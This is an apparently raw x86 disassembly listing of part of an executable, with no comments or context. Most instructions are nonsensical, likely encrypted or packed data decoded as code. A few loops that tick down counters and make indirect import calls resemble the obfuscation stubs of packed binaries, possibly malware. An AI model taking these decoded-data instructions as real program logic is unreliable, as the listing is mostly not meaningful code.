  409cb0:	xchg   ebp,eax
  409cb1:	mov    ebx,0xd99272bf
  409cb6:	add    eax,0x1f7981f8
  409cbb:	xor    eax,0x301180f6
  409cc0:	in     al,0x98
  409cc2:	mov    DWORD PTR [edi-0x2f],ecx
  409cc5:	aad    0x20
  409cc7:	rcr    BYTE PTR [ebx+0x41],1
  409cca:	sbb    esi,DWORD PTR [edx-0x1438ec92]
  409cd0:	vmwrite ecx,DWORD PTR [esp+edx*2]
  409cd4:	cdq    
  409cd5:	and    cl,BYTE PTR [ecx-0x2e]
  409cd8:	jnp    0x409cb2
  409cda:	(bad)  
  409cdc:	stos   DWORD PTR es:[edi],eax
  409cdd:	pop    DWORD PTR [edi+0x69e494d2]
  409ce3:	pop    esp
  409ce4:	push   0xdc9c2c39
  409ce9:	fs inc ebx
  409ceb:	popf   
  409cec:	fadd   st(7),st
  409cee:	es clc 
  409cf0:	arpl   WORD PTR fs:[esi+0x4b90cf8c],ax
  409cf7:	sbb    edi,ecx
  409cf9:	icebp  
  409cfa:	call   0x194e:0xc5fb95a5
  409d01:	aam    0x78
  409d03:	hlt    
  409d04:	push   0x3
  409d06:	fs jne 0x409d7f
  409d09:	xchg   ebx,eax
  409d0a:	cmc    
  409d0b:	mul    BYTE PTR ds:[ebp+0xa]
  409d0f:	into   
  409d10:	sub    DWORD PTR [ecx+0x2d],0x5b
  409d14:	cmc    
  409d15:	cmp    ah,BYTE PTR [esi]
  409d17:	test   bh,bl
  409d19:	ud0    ebx,DWORD PTR [ebx+0x37]
  409d1d:	fcmovnu st,st(5)
  409d1f:	mov    edi,0x92583768
  409d24:	push   esp
  409d25:	cmp    bh,bh
  409d27:	xlat   BYTE PTR ds:[ebx]
  409d28:	out    0xb7,al
  409d2a:	nop
  409d2b:	mov    ah,0x20
  409d2d:	std    
  409d2e:	inc    ebp
  409d2f:	sahf   
  409d30:	fs hlt 
  409d32:	add    esp,DWORD PTR [edi-0x21]
  409d35:	inc    ecx
  409d36:	lds    eax,FWORD PTR [ebx]
  409d38:	inc    eax
  409d39:	push   es
  409d3a:	leave  
  409d3b:	in     al,0xa9
  409d3d:	(bad)  
  409d3e:	push   ss
  409d3f:	in     eax,0xd
  409d41:	push   ecx
  409d42:	jo     0x409d0f
  409d44:	mov    BYTE PTR [esi-0x61],bl
  409d47:	pop    edx
  409d48:	ror    DWORD PTR [ebx+ebp*2+0x5180ba7b],0x61
  409d50:	aam    0x46
  409d52:	lods   eax,DWORD PTR ds:[esi]
  409d53:	ins    BYTE PTR es:[edi],dx
  409d54:	mov    bl,0x65
  409d56:	adc    al,0x25
  409d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d59:	cmp    al,0xed
  409d5b:	call   0x4a69:0xbae3362e
  409d62:	and    DWORD PTR [ebx],edx
  409d64:	xchg   cl,ah
  409d66:	inc    ebp
  409d67:	in     eax,0x24
  409d69:	rcr    ch,cl
  409d6b:	pop    esp
  409d6c:	push   esp
  409d6d:	inc    ebp
  409d6e:	repnz xchg ebp,eax
  409d70:	jl     0x409d0d
  409d72:	fsubrp st(6),st
  409d74:	add    BYTE PTR [edi-0xf],ch
  409d77:	sbb    al,0xa8
  409d79:	sti    
  409d7a:	cmp    BYTE PTR [esi+0x1f],0xec
  409d7e:	xor    al,0xd6
  409d80:	mov    BYTE PTR [ebp-0x68fa3837],al
  409d86:	ss inc ebx
  409d88:	add    bh,ah
  409d8a:	xor    al,0x0
  409d8c:	add    BYTE PTR [edi],cl
  409d8e:	test   BYTE PTR [eax+eax*1],dl
  409d91:	add    BYTE PTR [eax],al
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43368b
  409d9c:	sub    DWORD PTR ds:0x43375f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4336d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	clc    
  409dbf:	sub    eax,0xe23803b4
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	mov    cl,0x87
  409dcc:	ror    BYTE PTR ds:0x1277f85c,1
  409dd2:	jb     0x409dad
  409dd4:	inc    ebx
  409dd5:	loopne 0x409db9
  409dd7:	popa   
  409dd8:	mov    BYTE PTR [ebp-0x13117e20],ch
  409dde:	std    
  409ddf:	dec    esi
  409de0:	test   al,0xad
  409de2:	jg     0x409d7d
  409de4:	adc    al,0xa0
  409de6:	sub    cl,dh
  409de8:	stc    
  409de9:	push   edi
  409dea:	das    
  409deb:	test   eax,0xfdfc8bcf
  409df0:	cmp    DWORD PTR [ebx-0x4c],ebx
  409df3:	cmp    eax,0x5fea6458
  409df8:	fcmovu st,st(7)
  409dfa:	adc    eax,0x53b28b92
  409dff:	mov    ds:0x1f2dac03,eax
  409e04:	test   cl,ah
  409e06:	mov    edx,0x479e5133
  409e0b:	fwait
  409e0c:	shl    BYTE PTR [edi-0x12127e5a],0xea
  409e13:	ins    DWORD PTR es:[edi],dx
  409e14:	jmp    0xb6ff:0x961db382
  409e1b:	sub    BYTE PTR [edx+0x1968c5f9],dl
  409e21:	ja     0x409e30
  409e23:	fdivr  QWORD PTR [ebx]
  409e25:	imul   ecx,DWORD PTR [eax+0x4124421f],0xd034161b
  409e2f:	repz push ecx
  409e31:	popf   
  409e32:	mov    ebp,0xee31fa31
  409e37:	jo     0x409e7e
  409e39:	xlat   BYTE PTR ds:[ebx]
  409e3a:	inc    eax
  409e3b:	pop    ds
  409e3c:	aas    
  409e3d:	and    eax,DWORD PTR [ebx]
  409e3f:	pop    ebp
  409e40:	popa   
  409e41:	mov    edx,0xa2586079
  409e46:	sbb    edi,DWORD PTR [ebx-0x1aeebec9]
  409e4c:	mov    eax,0xc5e72c9b
  409e51:	inc    ecx
  409e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e53:	gs test eax,0xf643cd9f
  409e59:	mov    edi,0xebe7540
  409e5e:	inc    ebx
  409e5f:	push   edx
  409e60:	in     al,dx
  409e61:	pop    ebx
  409e62:	jmp    0x3c20:0xd9ca00b5
  409e69:	je     0x409e20
  409e6b:	popa   
  409e6c:	inc    eax
  409e6e:	inc    ebx
  409e6f:	scas   al,BYTE PTR es:[edi]
  409e70:	jne    0x409e1f
  409e72:	test   al,0x14
  409e74:	jge    0x409e64
  409e76:	je     0x409e48
  409e78:	push   ebp
  409e79:	hlt    
  409e7a:	cmp    DWORD PTR [esi-0x63],esp
  409e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e7e:	pop    edi
  409e7f:	shr    DWORD PTR [edx],cl
  409e81:	aad    0x4
  409e83:	aas    
  409e84:	pop    esi
  409e85:	mov    ah,0xa9
  409e87:	ret    0xca8d
  409e8a:	jno    0x409e90
  409e8c:	mov    esi,0x3276f04a
  409e91:	mov    edi,0x6c8bf945
  409e96:	clc    
  409e97:	lds    ebp,FWORD PTR [edx-0x26]
  409e9a:	fidiv  DWORD PTR [eax+0x7]
  409e9d:	aas    
  409e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e9f:	push   es
  409ea0:	pusha  
  409ea1:	xchg   edi,eax
  409ea2:	adc    eax,0x2e8d4e8e
  409ea7:	sbb    edx,DWORD PTR [edi+0x71]
  409eaa:	and    al,0x46
  409eac:	inc    ecx
  409ead:	nop
  409eae:	cmp    bl,0xcc
  409eb1:	mov    dl,0x2c
  409eb3:	jns    0x409e43
  409eb5:	loop   0x409e4a
  409eb7:	xor    eax,0xfbbe0367
  409ebc:	imul   ebp,DWORD PTR ds:0x4a561b3d,0xfffffffe
  409ec3:	or     eax,0x610a8bd2
  409ec8:	fidivr WORD PTR [ebx+0x474322f6]
  409ece:	div    BYTE PTR [esi]
  409ed0:	fadd   QWORD PTR [edx]
  409ed2:	push   es
  409ed3:	scas   eax,DWORD PTR es:[edi]
  409ed4:	mov    eax,0xae3b18a8
  409ed9:	or     DWORD PTR [ebx],edi
  409edb:	fwait
  409edc:	mov    ch,0xe
  409ede:	xor    eax,DWORD PTR [ecx]
  409ee0:	xor    eax,0x56acda2a
  409ee5:	mov    esp,0xaa288aff
  409eea:	push   cs
  409eeb:	pop    es
  409eec:	stos   BYTE PTR es:[edi],al
  409eed:	push   ds
  409eee:	cmp    eax,0xeffcecc7
  409ef3:	cmc    
  409ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ef5:	or     ebx,DWORD PTR [ebx+0xb]
  409ef8:	push   eax
  409ef9:	loop   0x409e8f
  409efb:	in     eax,dx
  409efc:	pop    esi
  409efd:	stc    
  409efe:	add    al,0x71
  409f00:	stos   BYTE PTR es:[edi],al
  409f01:	hlt    
  409f02:	enter  0x6072,0xa8
  409f06:	adc    BYTE PTR [ebx-0x6adfa23],cl
  409f0c:	inc    ecx
  409f0d:	dec    eax
  409f0e:	pop    ebx
  409f0f:	add    esp,DWORD PTR [esi+0x5a]
  409f12:	fidivr DWORD PTR [ebp-0x30]
  409f15:	mov    edi,0x95a811e7
  409f1a:	loope  0x409f2d
  409f1c:	or     DWORD PTR [ebx-0x240660a1],ecx
  409f22:	mov    esi,0xa1c916ed
  409f27:	in     al,dx
  409f28:	push   es
  409f29:	or     ebx,edi
  409f2b:	jge    0x409f92
  409f2d:	pop    ebx
  409f2e:	hlt    
  409f2f:	pop    eax
  409f30:	add    eax,DWORD PTR [ebx+0x70fb9158]
  409f36:	mov    al,0x5c
  409f38:	pop    esi
  409f39:	sbb    dl,ah
  409f3b:	call   0xfafc:0x65275fe
  409f42:	fnstsw WORD PTR [edi-0x41]
  409f45:	push   esp
  409f46:	mov    dh,0x2f
  409f48:	cmp    DWORD PTR [esi],0x6c
  409f4b:	es adc al,0x1f
  409f4e:	jmp    0x409f3b
  409f50:	xor    DWORD PTR [eax],0x66a18a8f
  409f56:	xor    al,0x88
  409f58:	fadd   DWORD PTR [ebp-0x30654a41]
  409f5e:	loop   0x409f09
  409f60:	xorps  xmm7,XMMWORD PTR [eax]
  409f63:	push   esi
  409f64:	call   0xf582f6e8
  409f69:	and    al,0xdf
  409f6b:	mov    bh,0x7d
  409f6d:	in     eax,0x33
  409f6f:	int    0xb
  409f71:	call   0x3356:0x12534c9e
  409f78:	scas   al,BYTE PTR es:[edi]
  409f79:	lea    ebx,[esp+esi*8+0x4c]
  409f7d:	sbb    al,bh
  409f7f:	add    al,0x58
  409f81:	pop    ds
  409f82:	loopne 0x409f95
  409f84:	sbb    ah,BYTE PTR [ebp-0x4e]
  409f87:	(bad)  
  409f88:	mov    ebx,0x54de3006
  409f8d:	sbb    DWORD PTR [esi],eax
  409f8f:	stos   DWORD PTR es:[edi],eax
  409f90:	dec    esp
  409f91:	ds aaa 
  409f93:	mov    ds:0x227552ee,eax
  409f98:	sbb    al,0x4e
  409f9a:	test   DWORD PTR [eax+0x7c],esi
  409f9d:	push   0x21
  409f9f:	mov    eax,ds:0x9c736309
  409fa4:	jge    0x409fea
  409fa6:	iret   
  409fa7:	inc    eax
  409fa8:	mov    eax,0xc26b48a7
  409fad:	scas   eax,DWORD PTR es:[edi]
  409fae:	mov    ds:0x75b7aeb2,eax
  409fb3:	push   es
  409fb4:	add    dl,bh
  409fb6:	pushf  
  409fb7:	xor    DWORD PTR fs:[esp+ebp*4],ebx
  409fbb:	push   ebx
  409fbc:	ret    
  409fbd:	mov    es,WORD PTR [eax-0x54]
  409fc0:	add    al,0x2e
  409fc2:	mov    bl,0x1
  409fc4:	jmp    0x5a96:0xc65c0bb2
  409fcb:	dec    ebx
  409fcc:	sub    al,0xd7
  409fce:	xchg   esp,eax
  409fcf:	mov    ebx,0xf8a4feb4
  409fd4:	inc    esp
  409fd5:	jmp    0xfbea7353
  409fda:	jnp    0x409fd8
  409fdc:	mov    dh,0x88
  409fde:	fs icebp 
  409fe0:	adc    BYTE PTR [ebx+0x7d076dcf],bl
  409fe6:	inc    esp
  409fe7:	fild   QWORD PTR [esi+0x47]
  409fea:	xchg   ecx,eax
  409feb:	pop    ss
  409fec:	rcl    ah,cl
  409fee:	fadd   QWORD PTR [edi+edx*8]
  409ff1:	push   ebp
  409ff2:	push   ds
  409ff3:	and    bh,ah
  409ff5:	lock mov ebx,0x6a2eeeb
  409ffb:	int3   
  409ffc:	sub    al,BYTE PTR [edx+0x351fe4b4]
  40a002:	aaa    
  40a003:	push   es
  40a004:	sbb    ebx,esi
  40a006:	test   al,0x76
  40a008:	in     eax,0xd4
  40a00a:	xor    BYTE PTR [edi],bh
  40a00c:	repz out dx,al
  40a00e:	fstp   DWORD PTR [esi-0x462f50f1]
  40a014:	jae    0x40a05b
  40a016:	add    BYTE PTR [eax],al
  40a018:	mov    edi,DWORD PTR ds:0x433753
  40a01e:	sbb    DWORD PTR ds:0x43368f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4336e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4336a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4336db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4336db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4336db,ecx
  40a059:	cmp    DWORD PTR ds:0x4336db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4338be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4336db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43368b,0x11
  40a090:	cmp    DWORD PTR ds:0x43368b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43368b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43368b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43368b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43368b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43368b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43368b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433683,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4336ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433693
  40a0ff:	mov    DWORD PTR ds:0x4336ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4336e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	push   esp
  40a127:	push   0xe08285f2
  40a12c:	jle    0x40a1ac
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	jbe    0x40a130
  40a134:	sbb    ebp,DWORD PTR [edi]
  40a136:	xor    eax,0xdbbb8470
  40a13b:	(bad)  
  40a13c:	cdq    
  40a13d:	js     0x40a1ba
  40a13f:	sub    bl,BYTE PTR [ebx-0x42]
  40a142:	mov    ds:0x2790d3b8,eax
  40a147:	test   eax,0x1158371
  40a14c:	das    
  40a14d:	push   cs
  40a14e:	lds    esp,FWORD PTR [ebx+0x13]
  40a151:	dec    ebp
  40a152:	cmp    eax,0x33fdd09d
  40a157:	lea    edi,[eax]
  40a159:	fsub   QWORD PTR [edx]
  40a15b:	add    al,0x13
  40a15d:	pop    ebx
  40a15e:	aas    
  40a15f:	enter  0xcbff,0x94
  40a163:	js     0x40a0f5
  40a165:	xchg   esi,eax
  40a166:	inc    edi
  40a167:	aad    0xb9
  40a169:	cmp    ah,0xe0
  40a16c:	js     0x40a1da
  40a16e:	mov    bh,0xc2
  40a170:	jno    0x40a106
  40a172:	int3   
  40a173:	repnz add BYTE PTR [ebx],0xb9
  40a177:	jmp    0x40a0fc
  40a179:	jbe    0x40a1b2
  40a17b:	cli    
  40a17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a17d:	das    
  40a17e:	call   FWORD PTR [eax+0x382e90c3]
  40a184:	shl    BYTE PTR [esi],1
  40a186:	or     BYTE PTR [ebx],dl
  40a188:	jmp    DWORD PTR [ecx+0x6e7be22]
  40a18e:	cmp    ch,bl
  40a190:	mov    esi,0xb4daa75e
  40a195:	psubw  mm4,QWORD PTR [ecx-0x3b824206]
  40a19c:	push   ecx
  40a19d:	inc    BYTE PTR [ecx]
  40a19f:	jge    0x40a1d8
  40a1a1:	in     eax,dx
  40a1a2:	pop    eax
  40a1a3:	test   DWORD PTR [ebx+0x2f],edx
  40a1a6:	mul    DWORD PTR [esi-0x1551258c]
  40a1ac:	aas    
  40a1ad:	jns    0x40a18d
  40a1af:	mov    edi,0x3f5bfaee
  40a1b4:	push   cs
  40a1b5:	movups XMMWORD PTR [ecx+0x74ccadb6],xmm7
  40a1bc:	pusha  
  40a1bd:	dec    esi
  40a1be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1bf:	js     0x40a1a7
  40a1c1:	pop    ds
  40a1c2:	jl     0x40a20b
  40a1c4:	adc    DWORD PTR [ebx+0x6d88dce9],esp
  40a1ca:	mov    esi,0x4bfc843f
  40a1cf:	(bad)  
  40a1d0:	popf   
  40a1d1:	dec    ecx
  40a1d2:	int    0xcc
  40a1d4:	xchg   esi,eax
  40a1d5:	cdq    
  40a1d6:	rsqrtps xmm5,XMMWORD PTR [edi]
  40a1d9:	dec    edi
  40a1da:	ror    DWORD PTR [eax+ebp*2+0x3f3d507],1
  40a1e1:	fnstcw WORD PTR [edx-0x78c2e8f9]
  40a1e7:	pop    esi
  40a1e8:	sahf   
  40a1e9:	lock stc 
  40a1eb:	push   ds
  40a1ec:	add    DWORD PTR [edx+0x82217cc],edx
  40a1f2:	ret    
  40a1f3:	adc    eax,0x80e7a742
  40a1f8:	cld    
  40a1f9:	or     ah,ah
  40a1fb:	mov    esi,eax
  40a1fd:	push   0x4d
  40a1ff:	test   DWORD PTR [esi],esi
  40a201:	ja     0x40a214
  40a203:	xchg   ebx,eax
  40a204:	fsub   QWORD PTR [eax+ecx*1]
  40a207:	push   eax
  40a208:	xchg   DWORD PTR [eax+ecx*8+0x7c045db],esi
  40a20f:	push   ds
  40a210:	int3   
  40a211:	fdiv   QWORD PTR [edx-0x5d]
  40a214:	push   cs
  40a215:	and    DWORD PTR [esi+0x35da1c22],ecx
  40a21b:	cmp    cl,dh
  40a21d:	inc    eax
  40a21e:	mov    ds:0x134560e8,al
  40a223:	inc    edx
  40a224:	mov    cl,BYTE PTR [eax]
  40a226:	xchg   BYTE PTR [ecx+0x7042b798],dl
  40a22c:	push   cs
  40a22d:	mov    ds:0xf0605300,eax
  40a232:	sub    al,ch
  40a234:	sub    al,0xdf
  40a236:	pop    esi
  40a237:	int3   
  40a238:	(bad)  
  40a239:	in     al,0xcb
  40a23b:	push   esi
  40a23c:	xchg   BYTE PTR [eax],ah
  40a23e:	loopne 0x40a1f4
  40a240:	pop    eax
  40a241:	in     eax,0x75
  40a243:	fisubr DWORD PTR [edx-0x292ac6f6]
  40a249:	inc    ecx
  40a24a:	xor    cl,BYTE PTR [edi]
  40a24c:	xor    al,0x1
  40a24e:	pusha  
  40a24f:	das    
  40a250:	sbb    dh,BYTE PTR [esi]
  40a252:	inc    esi
  40a253:	fwait
  40a254:	mov    esp,DWORD PTR [esi]
  40a256:	and    DWORD PTR ds:0x4fabd085,eax
  40a25c:	lock and eax,0x23c4e84f
  40a262:	sbb    DWORD PTR [edx],esi
  40a264:	mov    bh,dl
  40a266:	fprem  
  40a268:	and    BYTE PTR [esi],al
  40a26a:	(bad)  
  40a26b:	pop    ebx
  40a26c:	movnti DWORD PTR [esi+ebp*2-0x6b],eax
  40a271:	mov    ch,0xd0
  40a273:	test   DWORD PTR [ecx],ebp
  40a275:	sbb    cl,BYTE PTR [edi-0x5e]
  40a278:	and    BYTE PTR [esp+esi*2],dl
  40a27b:	movsx  edi,dh
  40a27e:	inc    eax
  40a27f:	mov    es,WORD PTR [eax+0x5ad07f98]
  40a285:	mov    WORD PTR [esi+0x18],ss
  40a288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a289:	in     al,dx
  40a28a:	in     eax,dx
  40a28b:	sub    eax,0xd72158b6
  40a290:	imul   ecx,DWORD PTR [esi-0x7865f437],0xefe479da
  40a29a:	or     ch,BYTE PTR [ecx+ecx*2+0x3202ad8f]
  40a2a1:	ds push 0x3601cb7
  40a2a7:	or     dl,dl
  40a2a9:	xchg   esi,eax
  40a2aa:	and    DWORD PTR [ebp+0x3868d702],0x7cb6533c
  40a2b4:	leave  
  40a2b5:	xchg   DWORD PTR [ebx],esi
  40a2b7:	lock nop
  40a2b9:	mov    ds:0x3e5fbca9,al
  40a2be:	aam    0x5c
  40a2c0:	cmp    DWORD PTR [edi+edx*4-0x332a107],ebp
  40a2c7:	push   ebp
  40a2c8:	fcomp  QWORD PTR [ebx]
  40a2ca:	imul   esp,DWORD PTR [ebx+0x2e05c84a],0xffffffe6
  40a2d1:	jae    0x40a25f
  40a2d3:	mov    DWORD PTR [ebp+edx*1-0x13804493],edi
  40a2da:	xchg   esi,eax
  40a2db:	call   0x5933e36f
  40a2e0:	cmp    BYTE PTR ds:0x226f2dbf,0x4f
  40a2e7:	nop
  40a2e8:	cmp    edi,DWORD PTR [eax+0x70]
  40a2eb:	ss adc eax,esp
  40a2ee:	inc    esi
  40a2ef:	or     dl,bl
  40a2f1:	push   esp
  40a2f2:	push   esp
  40a2f3:	jb     0x40a27f
  40a2f5:	add    DWORD PTR [ecx-0x748fd2a6],edx
  40a2fb:	dec    eax
  40a2fc:	cmp    BYTE PTR [ebp-0x2e],dh
  40a2ff:	js     0x40a36a
  40a301:	inc    edi
  40a302:	cld    
  40a303:	(bad)  
  40a304:	in     al,0x27
  40a306:	mov    bh,0xbb
  40a308:	mov    eax,0xda7a370f
  40a30d:	popf   
  40a30e:	ss scas eax,DWORD PTR es:[edi]
  40a310:	cwde   
  40a311:	outs   dx,BYTE PTR ds:[esi]
  40a312:	jg     0x40a2db
  40a314:	inc    ecx
  40a315:	sbb    ebp,esi
  40a317:	shl    BYTE PTR [eax+0x7f],cl
  40a31a:	aam    0x10
  40a31c:	(bad)  
  40a31d:	or     eax,0x9fec213c
  40a322:	sub    BYTE PTR [ecx+eax*4],0xa8
  40a326:	data16 and BYTE PTR [edx-0x33],ah
  40a32a:	adc    ah,bh
  40a32c:	icebp  
  40a32d:	pop    es
  40a32e:	dec    esi
  40a32f:	pop    ds
  40a330:	loope  0x40a31e
  40a332:	pop    es
  40a333:	push   ecx
  40a334:	mov    ebp,0x13f93100
  40a339:	inc    edi
  40a33a:	and    eax,0xbefedfea
  40a33f:	mov    DWORD PTR [esi+0x20],ecx
  40a342:	hlt    
  40a343:	pop    edx
  40a344:	and    BYTE PTR [esi-0x1ddd08eb],0x36
  40a34b:	rcr    edx,1
  40a34d:	inc    ecx
  40a34e:	or     BYTE PTR [edi],ch
  40a350:	mov    esp,DWORD PTR [ecx+0x4cbfb7e6]
  40a356:	add    ebx,DWORD PTR [eax+0x5a9765a6]
  40a35c:	js     0x40a3b3
  40a35e:	adc    al,0x98
  40a360:	xor    edx,DWORD PTR [esi]
  40a362:	push   edx
  40a363:	sub    cl,BYTE PTR [ecx]
  40a365:	xchg   ebx,eax
  40a366:	xor    al,0x87
  40a368:	rol    DWORD PTR [edi],1
  40a36a:	mov    al,0xb0
  40a36c:	sbb    bh,BYTE PTR [ecx+0x35]
  40a36f:	jp     0x40a355
  40a371:	shl    BYTE PTR [ebp-0x1],1
  40a374:	xchg   BYTE PTR [ecx+0x4d8bc5aa],ah
  40a37a:	call   0x25c26bb2
  40a37f:	jnp    0x40a3b7
  40a381:	inc    ebx
  40a382:	add    BYTE PTR [eax],al
  40a384:	add    BYTE PTR [eax],al
  40a386:	add    cl,ch
  40a388:	push   cs
  40a389:	add    BYTE PTR [eax],al
  40a38b:	add    BYTE PTR [ebx],dh
  40a38d:	shl    BYTE PTR [ebx],0x5
  40a390:	jnp    0x40a3c8
  40a392:	inc    ebx
  40a393:	add    BYTE PTR [eax-0x5d],al
  40a396:	jnp    0x40a3ce
  40a398:	inc    ebx
  40a399:	add    BYTE PTR [ebx+0x43367b3d],al
  40a39f:	add    BYTE PTR [esi],dl
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43367b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43376f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4336eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4336e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4336e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4336e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433717
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4336e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4336e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4336e7,eax
  40a43a:	mov    eax,ds:0x4336e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4336e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43369f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4337af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4337a3,0x433727
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433687,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	add    eax,0x4c0165da
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4a8:	add    ah,BYTE PTR [ebx-0x31]
  40a4ab:	xchg   edi,eax
  40a4ac:	mov    cl,0x1f
  40a4ae:	out    0x8d,eax
  40a4b0:	jno    0x40a44a
  40a4b2:	jl     0x40a529
  40a4b4:	sub    ecx,DWORD PTR [esi-0x7772fc37]
  40a4ba:	push   ss
  40a4bb:	mov    ecx,DWORD PTR [edi+ecx*2+0x2a76c41b]
  40a4c2:	je     0x40a455
  40a4c4:	test   eax,0xb2495b2c
  40a4c9:	mov    dh,BYTE PTR [edx-0x49]
  40a4cc:	xor    esp,DWORD PTR [esi]
  40a4ce:	push   ecx
  40a4cf:	test   DWORD PTR [eax],ebp
  40a4d1:	imul   edx,DWORD PTR [edi+0xd],0x63b4074c
  40a4d8:	fcom   QWORD PTR [ecx]
  40a4da:	out    0xb,eax
  40a4dc:	jbe    0x40a478
  40a4de:	or     ebp,DWORD PTR [edx-0x183641f0]
  40a4e4:	popw   ds
  40a4e6:	retf   0x9782
  40a4e9:	jns    0x40a558
  40a4eb:	inc    eax
  40a4ec:	loop   0x40a55b
  40a4ee:	dec    eax
  40a4ef:	xchg   esi,eax
  40a4f0:	push   0x30880af2
  40a4f5:	das    
  40a4f6:	gs xchg esp,eax
  40a4f8:	lds    eax,FWORD PTR [eax+0x5]
  40a4fb:	jbe    0x40a4c0
  40a4fd:	test   BYTE PTR ss:[edi-0x43],ah
  40a501:	repz cs mov edx,0xde94dbb0
  40a508:	push   esi
  40a509:	sbb    DWORD PTR [edi],edi
  40a50b:	ret    
  40a50c:	fistp  DWORD PTR [ecx]
  40a50e:	repz mov dl,0xc6
  40a511:	xlat   BYTE PTR ds:[ebx]
  40a512:	in     al,dx
  40a513:	sbb    esp,DWORD PTR [eax+0x54]
  40a516:	push   eax
  40a517:	push   ecx
  40a518:	cld    
  40a519:	cbw    
  40a51b:	push   0x6535c8e2
  40a520:	jmp    0xf668:0x1a958ef1
